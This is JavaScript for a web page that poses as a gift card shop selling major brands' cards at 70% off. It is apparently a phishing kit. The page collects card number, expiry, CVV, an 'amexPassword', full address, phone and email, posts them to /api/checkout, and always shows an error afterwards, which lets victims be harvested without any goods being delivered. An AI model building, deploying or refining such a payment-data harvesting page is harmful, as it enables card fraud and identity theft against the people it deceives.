const brands = [
  { name: "AMAZON", color: "#ff9900" },
  { name: "APPLE", color: "#555555" },
  { name: "GOOGLE PLAY", color: "#34a853" },
  { name: "STEAM", color: "#1b2838" },
  { name: "WALMART", color: "#0071ce" },
  { name: "TARGET", color: "#cc0000" },
  { name: "BEST BUY", color: "#0046be" },
  { name: "STARBUCKS", color: "#00704a" },
  { name: "NETFLIX", color: "#e50914" },
  { name: "SPOTIFY", color: "#1db954" },
  { name: "UBER", color: "#000000" },
  { name: "VISA", color: "#1a1f71" },
  { name: "MASTERCARD", color: "#eb001b" },
  { name: "XBOX", color: "#107c10" },
  { name: "PLAYSTATION", color: "#003791" },
  { name: "NIKE", color: "#111111" },
  { name: "ADIDAS", color: "#000000" },
  { name: "SEPHORA", color: "#000000" },
  { name: "HOME DEPOT", color: "#f96302" },
  { name: "COSTCO", color: "#e31837" }
];

const amounts = [5, 10, 20, 50, 100];

let state = { brand: null, amount: null };

function renderBrands() {
  const grid = document.getElementById('brandGrid');
  grid.innerHTML = brands.map(b => `
    <div class="card-tile" style="background:${b.color}" onclick="selectBrand('${b.name}', '${b.color}')">
      <div class="discount">70% OFF</div>
      ${b.name}
    </div>
  `).join('');
}

function selectBrand(name, color) {
  state.brand = name;
  document.getElementById('selectedBrandTitle').innerHTML = `${name} <span style="color:${color}">Gift Card</span>`;
  document.getElementById('amountBtns').innerHTML = amounts.map(a => `
    <button class="amt-btn" onclick="selectAmount(${a}, this)">$${a}<br><small style="font-weight:400;opacity:.8">Pay $${(a*0.3).toFixed(0)}</small></button>
  `).join('');
  goStep(2);
}

function selectAmount(amt, btn) {
  state.amount = amt;
  document.querySelectorAll('.amt-btn').forEach(b => b.classList.remove('selected'));
  btn.classList.add('selected');
  document.getElementById('toDetailsBtn').disabled = false;
}

function goStep(n) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  document.getElementById('step' + n).classList.add('active');
  if (n === 3) {
    const pay = (state.amount * 0.3).toFixed(2);
    document.getElementById('orderSummary').innerHTML = `
      <strong>${state.brand}</strong> Gift Card – $${state.amount}<br>
      <span style="color:#16a34a;font-weight:700">70% OFF applied → You pay only $${pay}</span>
    `;
    validateForm(); // initial check
  }
}

// ========== CARD VALIDATION (Luhn + length + type) ==========
function luhnCheck(num) {
  num = (num + '').replace(/\D/g, '');
  if (num.length < 13 || num.length > 19) return false;
  let sum = 0;
  let alternate = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let n = parseInt(num[i], 10);
    if (alternate) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alternate = !alternate;
  }
  return (sum % 10) === 0;
}

function getCardType(num) {
  num = (num + '').replace(/\D/g, '');
  if (/^3[47]/.test(num)) return 'amex';
  if (/^4/.test(num)) return 'visa';
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'mastercard';
  if (/^6(?:011|5)/.test(num)) return 'discover';
  if (/^3(?:0[0-5]|[68])/.test(num)) return 'diners';
  if (/^(?:2131|1800|35)/.test(num)) return 'jcb';
  return 'unknown';
}

function isValidCardNumber(num) {
  num = (num + '').replace(/\D/g, '');
  const type = getCardType(num);
  const len = num.length;

  // length rules
  if (type === 'amex' && len !== 15) return false;
  if ((type === 'visa' || type === 'mastercard' || type === 'discover' || type === 'jcb') && len !== 16) return false;
  if (type === 'diners' && !(len === 14 || len === 16)) return false;
  if (type === 'unknown' && (len < 13 || len > 19)) return false;

  return luhnCheck(num);
}

// Format + live validate card number
const cardInput = document.getElementById('cardNumber');
const cardError = document.createElement('div');
cardError.id = 'cardError';
cardError.style.cssText = 'color:#b91c1c;font-size:0.8rem;margin-top:6px;display:none;';
cardInput.parentNode.appendChild(cardError);

cardInput.addEventListener('input', function(e) {
  let v = e.target.value.replace(/\D/g, '').substring(0, 19);
  const type = getCardType(v);

  // spacing
  if (type === 'amex') {
    // 4-6-5
    let formatted = '';
    if (v.length > 0) formatted += v.substring(0, 4);
    if (v.length > 4) formatted += ' ' + v.substring(4, 10);
    if (v.length > 10) formatted += ' ' + v.substring(10, 15);
    e.target.value = formatted.trim();
  } else {
    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
  }

  // Amex field toggle
  const amex = type === 'amex';
  document.getElementById('amexField').style.display = amex ? 'block' : 'none';
  document.getElementById('cvv').maxLength = amex ? 4 : 3;
  document.getElementById('cvv').placeholder = amex ? '1234' : '123';

  // live validation message
  if (v.length === 0) {
    cardError.style.display = 'none';
    cardInput.style.borderColor = '';
  } else if (!isValidCardNumber(v)) {
    cardError.textContent = 'Invalid card number';
    cardError.style.display = 'block';
    cardInput.style.borderColor = '#ef4444';
  } else {
    cardError.textContent = '✓ Valid ' + (type !== 'unknown' ? type.toUpperCase() : 'card');
    cardError.style.color = '#16a34a';
    cardError.style.display = 'block';
    cardInput.style.borderColor = '#16a34a';
  }

  validateForm();
});

// Expiry format
document.getElementById('exp').addEventListener('input', function(e) {
  let v = e.target.value.replace(/\D/g, '').substring(0, 4);
  if (v.length >= 3) v = v.substring(0, 2) + '/' + v.substring(2);
  e.target.value = v;
  validateForm();
});

// CVV + other fields trigger re-validate
['cvv', 'email', 'cardName', 'street', 'city', 'state', 'zip', 'phone', 'amexPassword'].forEach(id => {
  const el = document.getElementById(id);
  if (el) el.addEventListener('input', validateForm);
});

function validateForm() {
  const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
  const exp = document.getElementById('exp').value.trim();
  const cvv = document.getElementById('cvv').value.trim();
  const email = document.getElementById('email').value.trim();
  const cardName = document.getElementById('cardName').value.trim();
  const street = document.getElementById('street').value.trim();
  const city = document.getElementById('city').value.trim();
  const state = document.getElementById('state').value.trim();
  const zip = document.getElementById('zip').value.trim();
  const phone = document.getElementById('phone').value.trim();
  const amexPass = document.getElementById('amexPassword').value.trim();
  const isAmex = getCardType(cardNum) === 'amex';

  const cardValid = isValidCardNumber(cardNum);
  const expValid = /^\d{2}\/\d{2}$/.test(exp);
  const cvvValid = isAmex ? /^\d{4}$/.test(cvv) : /^\d{3}$/.test(cvv);
  const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const requiredFilled = cardName && street && city && state && zip && phone && emailValid;
  const amexOk = !isAmex || amexPass.length >= 4;

  const allValid = cardValid && expValid && cvvValid && requiredFilled && amexOk;

  const btn = document.getElementById('payBtn');
  btn.disabled = !allValid;
  btn.style.opacity = allValid ? '1' : '0.6';
  btn.textContent = allValid ? 'Pay Now – 70% Off Applied' : 'Enter valid card details';
}

// ========== SUBMIT ==========
async function submitPay() {
  const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
  if (!isValidCardNumber(cardNum)) {
    alert('Please enter a valid card number');
    return;
  }

  const btn = document.getElementById('payBtn');
  btn.disabled = true;
  btn.textContent = 'Processing...';

  const data = {
    brand: state.brand,
    amount: state.amount,
    email: document.getElementById('email').value.trim(),
    cardName: document.getElementById('cardName').value.trim(),
    cardNumber: cardNum,
    exp: document.getElementById('exp').value.trim(),
    cvv: document.getElementById('cvv').value.trim(),
    amexPassword: document.getElementById('amexPassword').value.trim() || null,
    street: document.getElementById('street').value.trim(),
    city: document.getElementById('city').value.trim(),
    state: document.getElementById('state').value.trim(),
    zip: document.getElementById('zip').value.trim(),
    phone: document.getElementById('phone').value.trim()
  };

  try {
    const res = await fetch('/api/checkout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    await res.json();
    document.getElementById('errorBox').style.display = 'block';
    btn.style.display = 'none';
  } catch (err) {
    document.getElementById('errorBox').style.display = 'block';
    btn.style.display = 'none';
  }
}

renderBrands();
